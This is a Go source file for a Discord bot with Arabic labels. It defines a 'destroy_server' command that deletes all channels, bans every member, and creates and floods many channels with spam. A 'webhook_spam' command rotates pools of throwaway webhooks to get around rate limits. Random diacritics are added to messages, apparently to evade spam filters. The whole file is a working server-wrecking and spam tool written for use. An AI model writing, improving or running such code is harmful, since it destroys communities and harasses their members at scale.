package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/signal"
	"sync"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
)

var client = &http.Client{
	Timeout: 10 * time.Second,
	Transport: &http.Transport{
		DialContext: (&net.Dialer{
			Timeout:   5 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
		MaxIdleConns:        500,
		MaxIdleConnsPerHost: 100,
		IdleConnTimeout:     90 * time.Second,
	},
}

func main() {
	token := os.Getenv("MASTERGUARD_TOKEN")
	if token == "" {
		fmt.Println("❌ خطأ: لم يتم العثور على التوكن في متغير البيئة MASTERGUARD_TOKEN")
		return
	}

	sess, err := discordgo.New("Bot " + token)
	if err != nil {
		fmt.Println("خطأ في إنشاء جلسة البوت:", err)
		return
	}

	sess.Identify.Intents = discordgo.IntentsGuilds | discordgo.IntentsGuildMembers | discordgo.IntentsAll

	cmdName := "destroy_server"
	command := &discordgo.ApplicationCommand{
		Name:        cmdName,
		Description: "أمر تدمير السيرفر (باند مضمون وسرعة صاروخية)",
		Options: []*discordgo.ApplicationCommandOption{
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "room_name",
				Description: "اسم الرومات الجديدة",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionInteger,
				Name:        "rooms_count",
				Description: "عدد الرومات المراد إنشاؤها",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "message_content",
				Description: "محتوى رسالة السبام",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionInteger,
				Name:        "messages_count",
				Description: "عدد الرسائل في كل روم",
				Required:    true,
			},
		},
	}

	sess.AddHandler(func(s *discordgo.Session, i *discordgo.InteractionCreate) {
		if i.Type != discordgo.InteractionApplicationCommand {
			return
		}

		data := i.ApplicationCommandData()

		if data.Name == cmdName {
			if (i.Member.Permissions & discordgo.PermissionAdministrator) == 0 {
				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
					Type: discordgo.InteractionResponseChannelMessageWithSource,
					Data: &discordgo.InteractionResponseData{
						Content: "❌ يجب أن تكون مشرفاً لاستخدام هذا الأمر.",
						Flags:   discordgo.MessageFlagsEphemeral,
					},
				})
				return
			}

			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "🚀 جاري تدمير السيرفر وباند الأعضاء بالكامل في الخلفية...",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})

			options := data.Options
			optionMap := make(map[string]*discordgo.ApplicationCommandInteractionDataOption)
			for _, opt := range options {
				optionMap[opt.Name] = opt
			}

			roomName := optionMap["room_name"].StringValue()
			roomsCount := int(optionMap["rooms_count"].IntValue())
			messageContent := optionMap["message_content"].StringValue()
			messagesCount := int(optionMap["messages_count"].IntValue())
			guildID := i.GuildID

			go executeDestruction(s, token, guildID, roomName, roomsCount, messageContent, messagesCount)
			return
		}

		if data.Name == "webhook_spam" {
			if (i.Member.Permissions & discordgo.PermissionAdministrator) == 0 {
				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
					Type: discordgo.InteractionResponseChannelMessageWithSource,
					Data: &discordgo.InteractionResponseData{
						Content: "❌ يجب أن تكون مشرفاً لاستخدام هذا الأمر.",
						Flags:   discordgo.MessageFlagsEphemeral,
					},
				})
				return
			}

			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "⚡ جاري تشغيل مجمع الويب هوكات الذكي...",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})

			optionMap := make(map[string]*discordgo.ApplicationCommandInteractionDataOption)
			for _, opt := range data.Options {
				optionMap[opt.Name] = opt
			}

			targetChannel := optionMap["channel"].ChannelValue(s)
			webhookName := optionMap["webhook_name"].StringValue()
			messageContent := optionMap["message_content"].StringValue()
			messagesCount := int(optionMap["messages_count"].IntValue())

			go executeBucketLimitWebhookRotation(token, targetChannel.ID, webhookName, messageContent, messagesCount)
			return
		}
	})

	err = sess.Open()
	if err != nil {
		fmt.Println("خطأ في فتح الاتصال:", err)
		return
	}

	_, err = sess.ApplicationCommandCreate(sess.State.User.ID, "", command)
	if err != nil {
		fmt.Println("خطأ في تسجيل أمر تدمير السيرفر:", err)
	}

	// ⚠️ التعديل الجذري: تسجيل أمر الويب هوك هنا لكي يظهر في الديسكورد ولا يتم نسيانه
	_, err = sess.ApplicationCommandCreate(sess.State.User.ID, "", webhookCmd)
	if err != nil {
		fmt.Println("خطأ في تسجيل أمر الويب هوك:", err)
	}

	fmt.Println("🤖 البوت شغال الآن وجاهز لكل الأوامر!")

	stop := make(chan os.Signal, 1)
	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-stop

	sess.Close()
}

func executeDestruction(s *discordgo.Session, token, guildID, roomName string, roomsCount int, messageContent string, messagesCount int) {
	headers := map[string]string{
		"Authorization": "Bot " + token,
		"Content-Type":  "application/json",
	}

	go func() {
		req, _ := http.NewRequest("GET", "https://discord.com/api/v10/guilds/"+guildID+"/channels", nil)
		for k, v := range headers {
			req.Header.Set(k, v)
		}
		resp, err := client.Do(req)
		if err != nil {
			return
		}
		defer resp.Body.Close()

		var channels []map[string]interface{}
		json.NewDecoder(resp.Body).Decode(&channels)

		for _, ch := range channels {
			if id, ok := ch["id"].(string); ok {
				go func(chID string) {
					delReq, _ := http.NewRequest("DELETE", "https://discord.com/api/v10/channels/"+chID, nil)
					for k, v := range headers {
						delReq.Header.Set(k, v)
					}
					if r, e := client.Do(delReq); e == nil {
						r.Body.Close()
					}
				}(id)
			}
		}
	}()

	go func() {
		var userIDs []string
		after := ""

		for {
			members, err := s.GuildMembers(guildID, after, 1000)
			if err != nil || len(members) == 0 {
				break
			}

			for _, member := range members {
				userIDs = append(userIDs, member.User.ID)
				after = member.User.ID
			}

			if len(members) < 1000 {
				break
			}
		}

		batchSize := 50
		for i := 0; i < len(userIDs); i += batchSize {
			end := i + batchSize
			if end > len(userIDs) {
				end = len(userIDs)
			}

			for _, uID := range userIDs[i:end] {
				go func(id string) {
					for {
						err := s.GuildBanCreate(guildID, id, 0)
						if err == nil {
							break
						}
						time.Sleep(300 * time.Millisecond)
					}
				}(uID)
			}
			time.Sleep(100 * time.Millisecond)
		}
	}()

	var channelIDs []string
	var mu sync.Mutex
	var wg sync.WaitGroup

	groupSize := 10
	for i := 0; i < roomsCount; i += groupSize {
		end := i + groupSize
		if end > roomsCount {
			end = roomsCount
		}

		for j := i; j < end; j++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				payload, _ := json.Marshal(map[string]interface{}{
					"name": roomName,
					"type": 0,
				})
				req, _ := http.NewRequest("POST", "https://discord.com/api/v10/guilds/"+guildID+"/channels", bytes.NewBuffer(payload))
				for k, v := range headers {
					req.Header.Set(k, v)
				}

				resp, err := client.Do(req)
				if err != nil {
					return
				}
				defer resp.Body.Close()

				if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusCreated {
					var chResult map[string]interface{}
					json.NewDecoder(resp.Body).Decode(&chResult)
					if chID, ok := chResult["id"].(string); ok {
						mu.Lock()
						channelIDs = append(channelIDs, chID)
						mu.Unlock()
					}
				} else if resp.StatusCode == 429 {
					time.Sleep(200 * time.Millisecond)
				}
			}()
		}
		wg.Wait()
		time.Sleep(30 * time.Millisecond)
	}

	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	arabicDiacritics := []string{"ِ", "ُ", "َّ", "ٍ", "ٓ", "ٌ", "ْ", "ٰ"}

	for i := 0; i < len(channelIDs); i += groupSize {
		end := i + groupSize
		if end > len(channelIDs) {
			end = len(channelIDs)
		}

		for _, chID := range channelIDs[i:end] {
			go func(cID string) {
				for m := 0; m < messagesCount; m++ {
					diacriticsSalt := ""
					for k := 0; k <= (m % 3); k++ {
						diacriticsSalt += arabicDiacritics[rng.Intn(len(arabicDiacritics))]
					}
					finalMsg := messageContent + diacriticsSalt

					msgPayload, _ := json.Marshal(map[string]string{"content": finalMsg})
					msgReq, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+cID+"/messages", bytes.NewBuffer(msgPayload))
					for k, v := range headers {
						msgReq.Header.Set(k, v)
					}

					msgResp, err := client.Do(msgReq)
					if err == nil {
						if msgResp.StatusCode == 429 {
							time.Sleep(500 * time.Millisecond)
						}
						msgResp.Body.Close()
					}
					time.Sleep(50 * time.Millisecond)
				}
			}(chID)
		}
		time.Sleep(40 * time.Millisecond)
	}
}

var webhookCmd = &discordgo.ApplicationCommand{
	Name:        "webhook_spam",
	Description: "سبام عبر مجمع ويب هوكات الذكي والحذف التلقائي",
	Options: []*discordgo.ApplicationCommandOption{
		{
			Type:        discordgo.ApplicationCommandOptionChannel,
			Name:        "channel",
			Description: "الروم المحدد للإرسال",
			Required:    true,
		},
		{
			Type:        discordgo.ApplicationCommandOptionString,
			Name:        "webhook_name",
			Description: "اسم الويب هوك",
			Required:    true,
		},
		{
			Type:        discordgo.ApplicationCommandOptionString,
			Name:        "message_content",
			Description: "محتوى الرسالة",
			Required:    true,
		},
		{
			Type:        discordgo.ApplicationCommandOptionInteger,
			Name:        "messages_count",
			Description: "عدد الرسائل الإجمالي",
			Required:    true,
		},
	},
}

func executeBucketLimitWebhookRotation(token, channelID, webhookName, messageContent string, messagesCount int) {
	headers := map[string]string{
		"Authorization": "Bot " + token,
		"Content-Type":  "application/json",
	}

	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	arabicDiacritics := []string{"ِ", "ُ", "َّ", "ٍ", "ٓ", "ٌ", "ْ", "ٰ"}

	sentMessages := 0
	poolSize := 10
	messagesPerPoolRound := 50

	type WebhookInfo struct {
		ID  string
		URL string
	}

	round := 1
	for sentMessages < messagesCount {
		var pool []WebhookInfo
		var mu sync.Mutex
		var wgCreation sync.WaitGroup

		for i := 0; i < poolSize; i++ {
			wgCreation.Add(1)
			go func(index int) {
				defer wgCreation.Done()
				nameSuffix := fmt.Sprintf("-%d-%d", index+1, time.Now().UnixNano()%10000)
				whPayload, _ := json.Marshal(map[string]string{"name": webhookName + nameSuffix})
				whReq, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+channelID+"/webhooks", bytes.NewBuffer(whPayload))
				for k, v := range headers {
					whReq.Header.Set(k, v)
				}

				whResp, err := client.Do(whReq)
				if err != nil {
					return
				}
				defer whResp.Body.Close()

				if whResp.StatusCode == http.StatusOK || whResp.StatusCode == http.StatusCreated {
					var whResult map[string]interface{}
					if err := json.NewDecoder(whResp.Body).Decode(&whResult); err == nil {
						if id, okID := whResult["id"].(string); okID {
							if tk, okTk := whResult["token"].(string); okTk {
								mu.Lock()
								pool = append(pool, WebhookInfo{
									ID:  id,
									URL: fmt.Sprintf("https://discord.com/api/v10/webhooks/%s/%s", id, tk),
								})
								mu.Unlock()
							}
						}
					}
				}
			}(i)
		}
		wgCreation.Wait()

		if len(pool) == 0 {
			time.Sleep(1 * time.Second)
			continue
		}

		currentBatchSize := messagesPerPoolRound
		if messagesCount-sentMessages < currentBatchSize {
			currentBatchSize = messagesCount - sentMessages
		}

		var spamWg sync.WaitGroup
		for j := 0; j < currentBatchSize; j++ {
			spamWg.Add(1)
			go func(msgIdx int, wh WebhookInfo) {
				defer spamWg.Done()

				diacriticsSalt := ""
				for k := 0; k <= (msgIdx % 3); k++ {
					diacriticsSalt += arabicDiacritics[rng.Intn(len(arabicDiacritics))]
				}
				finalMsg := messageContent + diacriticsSalt
				msgPayload, _ := json.Marshal(map[string]string{"content": finalMsg})

				for {
					msgReq, _ := http.NewRequest("POST", wh.URL, bytes.NewBuffer(msgPayload))
					msgReq.Header.Set("Content-Type", "application/json")

					msgResp, err := client.Do(msgReq)
					if err == nil {
						if msgResp.StatusCode == http.StatusOK || msgResp.StatusCode == http.StatusNoContent {
							msgResp.Body.Close()
							break
						} else if msgResp.StatusCode == 429 {
							msgResp.Body.Close()
							time.Sleep(200 * time.Millisecond)
							continue
						}
						msgResp.Body.Close()
					}
					break
				}
			}(sentMessages+j, pool[j%len(pool)])
		}
		spamWg.Wait()
		sentMessages += currentBatchSize

		time.Sleep(3 * time.Second)

		var delWg sync.WaitGroup
		for _, wh := range pool {
			delWg.Add(1)
			go func(wID string) {
				defer delWg.Done()
				delReq, _ := http.NewRequest("DELETE", "https://discord.com/api/v10/webhooks/"+wID, nil)
				for k, v := range headers {
					delReq.Header.Set(k, v)
				}
				if r, e := client.Do(delReq); e == nil {
					r.Body.Close()
				}
			}(wh.ID)
		}
		delWg.Wait()

		round++
		time.Sleep(500 * time.Millisecond)
	}
}
